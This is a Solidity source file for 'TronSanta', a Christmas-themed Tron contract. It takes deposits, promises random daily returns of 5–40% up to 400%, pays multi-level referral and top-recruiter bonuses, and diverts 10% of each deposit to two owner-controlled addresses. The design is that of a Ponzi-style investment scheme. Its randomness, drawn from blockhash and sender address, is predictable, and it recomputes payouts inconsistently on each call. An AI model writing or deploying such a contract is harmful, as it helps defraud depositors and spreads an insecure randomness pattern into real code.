//SourceUnit: TronSanta.sol


pragma solidity >=0.4.23 <0.6.0;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract SantaClaus {
    address internal santaClaus;

    event onSantaTransferred(address indexed previousSanta, address indexed newSanta);
    constructor() public {
        santaClaus = msg.sender;
    }
    modifier onlySanta() {
        require(msg.sender == santaClaus);
        _;
    }
    function reassignSanta(address _newSanta) public onlySanta {
        require(_newSanta != address(0));
        emit onSantaTransferred(santaClaus, _newSanta);
        santaClaus = _newSanta;
    }
}

contract Random {
    uint internal saltForRandom;

    function _rand() internal returns (uint256) {
        uint256 lastBlockNumber = block.number - 1;

        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        // This turns the input data into a 100-sided die
        // by dividing by ceil(2 ^ 256 / 100).
        uint256 factor = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

        saltForRandom += uint256(msg.sender) % 100 + uint256(uint256(hashVal) / factor);

        return saltForRandom;
    }

    function _randRange(uint256 min, uint256 max) internal returns (uint256) {
        return uint256(keccak256(abi.encodePacked(_rand()))) % (max - min + 1) + min;
    }

    function _randChance(uint percent) internal returns (bool) {
        return _randRange(0, 100) < percent;
    }

    function _now() internal view returns (uint256) {
        return now;
    }
}

contract TronSanta is SantaClaus, Random{
    using SafeMath for uint256;

    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    address payable private reindeerFood;
    address payable private sleighRepair;

    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    uint256[6] dailyRewards = [5, 10, 11, 20, 21, 40];
    uint256[] public cycles;
    uint256[] public ref_bonuses;
    uint256[] public elf_bonuses;

    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public ChristmasElfs;
    mapping(address => User) public users;

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address payable _reindeerFood,
        address payable _sleighRepair) public {

        santaClaus = msg.sender;
        reindeerFood = _reindeerFood;
        sleighRepair = _sleighRepair;

        elf_bonuses.push(30);
        elf_bonuses.push(20);
        elf_bonuses.push(15);
        elf_bonuses.push(10);
        elf_bonuses.push(9);
        elf_bonuses.push(5);
        elf_bonuses.push(5);
        elf_bonuses.push(3);
        elf_bonuses.push(2);
        elf_bonuses.push(1);

        ref_bonuses.push(1000); // 10%
        ref_bonuses.push(500); // 5%
        ref_bonuses.push(200); // 2%
        ref_bonuses.push(100); // 1%
        ref_bonuses.push(50); // 0,5%
        ref_bonuses.push(25); // 0,25%
        ref_bonuses.push(25); // 0,25%


        cycles.push(300000000000);
        cycles.push(1000000000000);
        cycles.push(1e56);
    }

    /******************************** GAS USED METHODS ********************************************/

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    /**
    @dev Setter for reindeerFood address
    */
    function setStablesDeer(address payable _newStable) public onlySanta {
        require(_newStable != address(0));
        reindeerFood = _newStable;
    }

    /**
    @dev Setter for sleighRepair address
    */
    function setSleighAccount(address payable _newSleighRepair) public onlySanta {
        require(_newSleighRepair != address(0));
        sleighRepair = _newSleighRepair;
    }

    /**
    @dev msg.sender add new deposit
    */
    function deposit(address _upLine) payable public {
        _setUpLine(msg.sender, _upLine);
        _deposit(msg.sender, msg.value);
    }

    /**
    @dev msg.sender withdraw available amount
    */
    function withdraw() public {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        require(users[msg.sender].payouts < max_payout, "Full payouts");
        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }
            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }

        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }
            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }

        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }
            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }
            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");

        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;
        msg.sender.transfer(to_payout);
        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }

    /**
   @dev max result in circle - 400%
   */
    function maxPayoutOf(uint256 _amount) pure public returns(uint256) {
        return _amount * 40 / 10;
    }

    /******************************** INTERNAL METHODS ********************************************/

    /**
    @dev New Upline creation
    */
    function _setUpLine(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != santaClaus && (users[_upline].deposit_time > 0 || _upline == santaClaus)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);
            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++; // увеличение структуры пригласившего

                _upline = users[_upline].upline;
            }
        }
    }

    /**
    @dev Add new deposit
    @ check available withdraw, add reward to referer, add reward in elf's pool, transfer food and parts for Santa
    */
    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == santaClaus, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;

            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount"); // min 100 TRX

        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;

        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10;
            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }
        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
        }
        reindeerFood.transfer(_amount / 20);
        sleighRepair.transfer(_amount / 20);
    }

    /**
    @dev accrual 3% to elf's pool
    */
    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;
        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < elf_bonuses.length; i++) {
            if(ChristmasElfs[i] == upline) break;
            if(ChristmasElfs[i] == address(0)) {
                ChristmasElfs[i] = upline;
                break;
            }
            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][ChristmasElfs[i]]) {
                for(uint8 j = i + 1; j < elf_bonuses.length; j++) {
                    if(ChristmasElfs[j] == upline) {
                        for(uint8 k = j; k <= elf_bonuses.length; k++) {
                            ChristmasElfs[k] = ChristmasElfs[k + 1];
                        }
                        break;
                    }
                }
                for(uint8 j = uint8(elf_bonuses.length - 1); j > i; j--) {
                    ChristmasElfs[j] = ChristmasElfs[j - 1];
                }
                ChristmasElfs[i] = upline;
                break;
            }
        }
    }

    /**
    @dev accrual referral rewards to upline
    */
    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break; // не для админа

            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 10000; // 100,00
                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
            }
            up = users[up].upline;
        }
    }

    /**
    @dev distribution of rewards to the most hardworking elves
    */
    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;
        for(uint8 i = 0; i < elf_bonuses.length; i++) {
            if(ChristmasElfs[i] == address(0)) break;

            uint256 win = draw_amount * elf_bonuses[i] / 10000; // 100,00

            users[ChristmasElfs[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(ChristmasElfs[i], win);
        }

        for(uint8 i = 0; i < elf_bonuses.length; i++) {
            ChristmasElfs[i] = address(0);
        }
    }

    function _generatePercent() private returns(uint256) {
        uint256 firstGroup = _generateRandom(60, 100);
        uint256 secondGroup = _generateRandom(30, 75);
        uint256 thirdGroup = _generateRandom(0, 65);

        if (firstGroup >= secondGroup && firstGroup >= thirdGroup) {
            return _generateRandom(dailyRewards[0], dailyRewards[1]);
        }
        if (secondGroup >= firstGroup && secondGroup >= thirdGroup) {
            return _generateRandom(dailyRewards[2], dailyRewards[3]);
        }
        if (thirdGroup >= firstGroup && thirdGroup >= secondGroup) {
            return _generateRandom(dailyRewards[4], dailyRewards[5]);
        }
    }

    function _generateRandom(uint256 _begin, uint256 _end) private returns (uint256) {
        return _randRange(_begin, _end);
    }

    /******************************** GETTERS METHODS ********************************************/

    /**
     @dev return current deposit and max income
     */
    function payoutOf(address _addr) public returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {

            uint256 dailyCount = ((block.timestamp - users[_addr].deposit_time) / 1 days);

            if (dailyCount == 0) {
                payout = 0;
            }
            else {
                for(uint i =0; i< dailyCount; i++) {
                    uint256 dailyPercent = _generatePercent();
                    payout = payout + (users[_addr].deposit_amount *dailyPercent / 100);
                }
                payout = payout - users[_addr].deposit_payouts;
            }

            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    /**
    @dev information about User
    */
    function userInfo(address _addr) view public returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    /**
    @dev aggregation information about User
    */
    function userInfoTotals(address _addr) view public returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    /**
    @dev aggregation information about key params
    */
    function contractInfo() view public returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][ChristmasElfs[0]]);
    }

    /**
    @dev return 2 arrays to addresses most hardworking elfs and their deposits
    */
    function elfTopInfo() view public returns(address[10] memory elfs, uint256[10] memory deposits) {
        for(uint8 i = 0; i < elf_bonuses.length; i++) {
            if(ChristmasElfs[i] == address(0)) break;

            elfs[i] = ChristmasElfs[i];
            deposits[i] = pool_users_refs_deposits_sum[pool_cycle][ChristmasElfs[i]];
        }
    }

    /**
    @dev return reindeerFood address
    */
    function getStablesDeer() public view onlySanta returns (address) {
        return reindeerFood;
    }

    /**
   @dev return sleighRepair address
   */
    function getSleighAccount() public view onlySanta returns (address) {
        return sleighRepair;
    }

}